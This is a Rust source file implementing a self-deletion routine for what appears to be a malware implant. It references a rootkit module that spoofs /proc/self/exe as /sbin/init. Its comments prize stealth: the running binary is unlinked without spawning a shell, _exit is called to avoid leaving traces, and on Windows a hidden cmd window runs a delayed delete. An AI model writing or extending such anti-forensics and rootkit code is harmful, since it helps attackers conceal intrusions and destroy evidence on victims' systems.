/// Self-deletion module.
///
/// Linux: uses libc::unlink() to delete the executable directly — no sh child process.
///   - More stealthy than "sh -c sleep 2 && rm" (no shell spawned, no command-line exposure).
///   - Linux allows unlinking a running executable; the inode ref-count stays positive,
///     the process keeps running until exit, but the directory entry (filename) disappears immediately.
///   - Synchronous: deletion completes before exit, no overlap window.
///
/// Windows: falls back to a cmd-based delayed delete (Windows cannot delete a running exe).

pub fn self_delete() {
    // Use cached exe path (set before rootkit hide_self() spoofs /proc/self/exe).
    // current_exe() after hide_self() returns /sbin/init — we must NOT use that.
    // rootkit 模块仅存在于 unix 构建（lib_entry.rs 的 mod rootkit 带 #[cfg(unix)]）；
    // windows 构建直接取当前 exe。
    #[cfg(unix)]
    let exe = crate::rootkit::get_exe_path()
        .or_else(|| std::env::current_exe().ok());
    #[cfg(not(unix))]
    let exe = std::env::current_exe().ok();
    let exe = match exe {
        Some(e) => e,
        None => {
            // No path available — just exit without running atexit handlers.
            #[cfg(unix)]
            unsafe { libc::_exit(0) };
            #[cfg(not(unix))]
            std::process::exit(0);
        }
    };

    #[cfg(unix)]
    {
        // Linux: direct unlink, no shell child process.
        // Filename disappears immediately from directory; inode (and process) lives on.
        use std::ffi::CString;
        if let Ok(path_c) = CString::new(exe.to_string_lossy().as_bytes()) {
            unsafe { libc::unlink(path_c.as_ptr()); }
        }
        // _exit avoids running Rust/C atexit handlers that could leave traces.
        unsafe { libc::_exit(0) };
    }

    #[cfg(windows)]
    {
        // Windows does not allow deleting a running executable; use cmd delayed delete
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        let _ = Command::new("cmd")
            .args(&[
                "/c",
                &format!("timeout /t 2 /nobreak >nul & del \"{}\"", exe.display()),
            ])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .spawn();
        std::process::exit(0);
    }
}
